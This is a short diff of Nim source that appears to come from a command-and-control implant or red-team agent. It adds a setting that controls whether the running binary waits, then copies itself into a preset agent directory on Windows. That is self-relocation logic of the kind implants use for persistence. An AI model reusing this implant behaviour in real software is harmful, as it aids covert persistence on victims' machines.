@@ -529,7 +529,7 @@ proc is_elevated(): string =
 proc windows_start*(): void =
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
-    if is_exe and (binary_path != agent_execution_path_windows):
+    if is_exe and reloc_on_exec_windows and (binary_path != agent_execution_path_windows):
         var agent_execution_dir = splitFile(agent_execution_path_windows)[0]
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_windows)
